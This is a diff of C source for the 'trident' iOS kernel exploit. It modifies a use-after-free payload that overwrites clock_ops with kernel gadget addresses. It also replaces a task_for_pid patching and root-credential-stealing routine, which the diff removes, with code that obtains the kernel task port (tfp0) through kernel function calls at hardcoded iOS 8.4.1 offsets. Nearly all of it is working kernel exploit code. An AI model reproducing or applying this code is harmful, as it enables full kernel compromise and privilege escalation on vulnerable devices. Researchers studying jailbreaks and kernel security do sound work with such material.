@@ -174,7 +174,7 @@ static uint32_t kwrite32(uint32_t addr, uint32_t val)
     return val;
 }
 
-static void exec_prim(uint32_t fct, uint32_t arg1, uint32_t arg2)
+static uint32_t exec_prim(uint32_t fct, uint32_t arg1, uint32_t arg2)
 {
     int attr;
     unsigned int attrCnt;
@@ -184,9 +184,11 @@ static void exec_prim(uint32_t fct, uint32_t arg1, uint32_t arg2)
     write(fildes[1], &arg1, 4);
     write(fildes[1], &arg2, 4);
     write(fildes[1], &fct, 4);
-    clock_get_attributes(clk_realtime, pipebuf, &attr, &attrCnt);
+    uint32_t ret = clock_get_attributes(clk_realtime, pipebuf, &attr, &attrCnt);
     
     read(fildes[0], data, 64);
+    
+    return ret;
 }
 
 static uint32_t kread32_prim(uint32_t addr)
@@ -279,6 +281,8 @@ int trident_initialize(void)
 
 int trident(addr_t slide)
 {
+    kern_return_t retval = KERN_SUCCESS;
+    
     mach_port_name_t kernel_task = MACH_PORT_NULL;
     struct stat buf;
     mach_port_t master = 0;
@@ -327,14 +331,18 @@ retry:
     bzero((void *)fakebuf, fakesize);
     
     *(uint32_t *)(clock_ops_overwrite + 0x00) = koffset(off_OSSerializer_serialize) + slide;
+    *(uint32_t *)(clock_ops_overwrite + 0x04) = 0;
+    *(uint32_t *)(clock_ops_overwrite + 0x08) = 0;
     *(uint32_t *)(clock_ops_overwrite + 0x0C) = koffset(off_calend_gettime) + slide;
     *(uint32_t *)(clock_ops_overwrite + 0x10) = koffset(off_bufattr_cpx) + slide;
     
-    *(uint32_t *)(uaf_payload_buffer + 0x00) = (uint32_t)clock_ops_overwrite;
-    *(uint32_t *)(uaf_payload_buffer + 0x04) = koffset(off_clock_ops) + slide;
-    *(uint32_t *)(uaf_payload_buffer + 0x08) = koffset(off_copyin) + slide;
+    *(uint32_t *)(uaf_payload_buffer + 0x00) = (uint32_t)clock_ops_overwrite;               // =r0
+    *(uint32_t *)(uaf_payload_buffer + 0x04) = koffset(off_clock_ops) + slide;              // =r1
+    *(uint32_t *)(uaf_payload_buffer + 0x08) = koffset(off_copyin) + slide;                 // =copyin(r0, r1, 0x14) // r2=0x14
+    *(uint32_t *)(uaf_payload_buffer + 0x0C) = 0;
     *(uint32_t *)(uaf_payload_buffer + 0x10) = koffset(off_OSSerializer_serialize) + slide;
     *(uint32_t *)(uaf_payload_buffer + 0x14) = koffset(off_bx_lr) + slide;
+    *(uint32_t *)(uaf_payload_buffer + 0x18) = 0;
     *(uint32_t *)(uaf_payload_buffer + 0x1C) = koffset(off_OSSymbol_getMetaClass) + slide;
     *(uint32_t *)(uaf_payload_buffer + 0x20) = koffset(off_bx_lr) + slide;
     *(uint32_t *)(uaf_payload_buffer + 0x24) = koffset(off_bx_lr) + slide;
@@ -496,91 +504,36 @@ val; \
         goto fail;
     }
     
-    /* find kernel pmap */
-    uint32_t pmap = koffset(off_kernel_pmap) + slide;
-    uint32_t store = kread32_prim(pmap);
-    tte_virt = kread32_prim(store + 0);
-    tte_phys = kread32_prim(store + 4);
-    flush_dcache = koffset(off_flush_dcache) + slide;
-    invalidate_tlb = koffset(off_invalidate_tlb) + slide;
-    LOG("found kernel_pmap: " ADDR, pmap);
-    LOG("found kernel_pmap_store: " ADDR, store);
-    LOG("virt: " ADDR, tte_virt);
-    LOG("phys: " ADDR, tte_phys);
+    // tfp0
     
-    myuid = getuid();
-    LOG("uid: %d", myuid);
-    if(myuid != 0)
-    {
-        // elevation to root privilege by xerub
-        uint32_t kproc = 0;
-        myproc = 0;
-        mycred = 0;
-        pid_t mypid = getpid();
-        uint32_t proc = kread32_prim(koffset(off_allproc) + slide);
-        while (proc)
-        {
-            uint32_t pid = kread32_prim(proc + koffset(off_p_pid));
-            if (pid == mypid)
-            {
-                myproc = proc;
-            }
-            else if (pid == 0)
-            {
-                kproc = proc;
-            }
-            proc = kread32_prim(proc);
-        }
-        mycred = kread32_prim(myproc + koffset(off_p_ucred));
-        uint32_t kcred = kread32_prim(kproc + koffset(off_p_ucred));
-        kwrite32_prim(myproc + koffset(off_p_ucred), kcred);
-        setuid(0);
-        LOG("god root?: %x", getuid());
-    }
+    // ref: siguza's cl0ver https://blog.siguza.net/cl0ver/
+    // *task_addr = ipc_port_copyout_send(ipc_port_make_send(kernel_task->itk_self), current_task()->itk_space);
     
-    uint32_t tfp_base_addr = koffset(off_task_for_pid) + slide;
-    uint32_t pid_check_addr = tfp_base_addr + koffset(off_pid_check);
-    LOG("pid_check_addr: " ADDR, pid_check_addr);
-
-    LOG("patching kernel: pid_check");
-    patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, pid_check_addr & ~0xFFF);
-    kwrite32_prim(pid_check_addr, 0xbf00bf00); // beq -> NOP
-    usleep(100000);
+    // 8.4.1 n42 koffsets
+    // itk_self: 0xa4
+    // itk_space: 0x1a8
+    // ipc_port_copyout_send: 800162fc
+    // ipc_port_make_send: 80016274
     
-    uint32_t posix_check_ret_addr = 0;
-    uint32_t posix_check_ret_val = 0;
-    uint32_t mac_proc_check_ret_addr = 0;
-    uint32_t mac_proc_check_ret_val = 0;
+    uint32_t current_task = exec_prim(0x8003a3f1 + slide, 0, 0);
+    LOG("current_task: 0x%08x", current_task);
     
-    if(myuid != 0)
-    {
-        LOG("patching kernel: posix_check");
-        posix_check_ret_addr = tfp_base_addr + koffset(off_posix_check);
-        posix_check_ret_val = kread32_prim(posix_check_ret_addr);
-        patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, posix_check_ret_addr & ~0xFFF);
-        kwrite32_prim(posix_check_ret_addr, posix_check_ret_val + 0xff); // cmp r0, #ff
-        
-        LOG("patching kernel: mac_proc_check");
-        mac_proc_check_ret_addr = tfp_base_addr + koffset(off_mac_proc_check);
-        mac_proc_check_ret_val = kread32_prim(mac_proc_check_ret_addr);
-        patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, mac_proc_check_ret_addr & ~0xFFF);
-        kwrite32_prim(mac_proc_check_ret_addr, mac_proc_check_ret_val | 0x10000); // cmp.w r8, #1
-    }
+    uint32_t current_task_itk_space = kread32_prim(current_task + 0x1a8);
+    LOG("current_task()->itk_space: 0x%08x", current_task_itk_space);
     
-    exec_flush_dcache();
-    usleep(100000);
+    uint32_t kernel_task_addr = kread32_prim(0x8040a098 + slide);
+    LOG("kernel_task: 0x%08x", kernel_task_addr);
     
-    LOG("trying task_for_pid(0)");
-    kern_return_t retval = KERN_SUCCESS;
-    retval = task_for_pid(mach_task_self(), 0, &kernel_task);
-    tfp0 = kernel_task;
-    LOG("task_for_pid: %x, %s", tfp0, mach_error_string(retval));
-    if(retval != KERN_SUCCESS || !MACH_PORT_VALID(tfp0))
-    {
-        ERR("task_for_pid(0) failed");
-        goto fail;
-    }
+    uint32_t kernel_task_itk_self = kread32_prim(kernel_task_addr + 0xa4);
+    LOG("kernel_task->itk_self: 0x%08x", kernel_task_itk_self);
     
+    uint32_t sright = exec_prim(0x80016275 + slide, kernel_task_itk_self, 0);
+    LOG("sright: 0x%08x", sright);
+    
+    task_t tret = (task_t)exec_prim(0x800162fd + slide, sright, current_task_itk_space);
+    LOG("tret: 0x%08x", tret);
+    
+    tfp0 = tret;
     LOG("got tfp0: %x", tfp0);
     
     LOG("checking tfp0");
@@ -626,16 +579,6 @@ val; \
         ERR("mach_vm_deallocate failed");
         goto fail;
     }
-    
-    if(myuid != 0)
-    {
-        LOG("reverting posix_check");
-        kwrite32(posix_check_ret_addr, posix_check_ret_val);
-        LOG("reverting mac_proc_check");
-        kwrite32(mac_proc_check_ret_addr, mac_proc_check_ret_val);
-        exec_flush_dcache();
-    }
-    usleep(100000);
     
     if (port_fds[0] > 0)  close(port_fds[0]);
     if (port_fds[1] > 0)  close(port_fds[1]);
